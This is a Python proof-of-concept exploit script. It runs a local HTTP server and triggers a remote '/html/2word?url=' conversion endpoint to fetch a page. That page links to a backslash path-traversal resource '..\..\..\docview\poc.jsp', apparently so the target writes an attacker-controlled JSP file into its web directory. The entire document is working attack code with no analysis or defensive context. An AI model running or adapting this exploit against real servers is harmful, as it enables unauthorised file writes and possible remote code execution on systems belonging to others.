import http.server
import socketserver
import sys
import threading
import requests

visited_pages = {'/': False, '/..\..\..\docview\poc.jsp': False}

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global visited_pages
        if self.path in visited_pages:
            visited_pages[self.path] = True

            if all(visited_pages.values()):
                print("Success! Go to http://{}:{}/poc.jsp".format(remote_ip,remote_port))
                threading.Thread(target=server.shutdown).start()

        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f'''<html>
<head><title>Index Page</title></head>
<body>
    <link href="http://{ip_address}:{port}/..\..\..\docview\poc.jsp">
</body>
</html>'''
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/..\..\..\docview\poc.jsp':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Poc Works!</h1></body></html>")
        else:
            self.send_error(404, "File not found")

    def log_message(self, format, *args):
        return

def send_request_to_remote():
    remote_url = f'http://{remote_ip}:{remote_port}/html/2word?url={ip_address}:{port}'
    try:
        response = requests.get(remote_url)
    except Exception as e:
        pass

if len(sys.argv) < 5:
    print("Usage: python script.py <IP_ADDRESS> <PORT> <REMOTE_IP> <REMOTE_PORT>")
    sys.exit(1)

ip_address = sys.argv[1]
port = int(sys.argv[2])
remote_ip = sys.argv[3]
remote_port = sys.argv[4]

def start_server():
    global server
    server = socketserver.TCPServer((ip_address, port), MyHttpRequestHandler)
    server.serve_forever()

server_thread = threading.Thread(target=start_server)
server_thread.start()

send_request_to_remote()
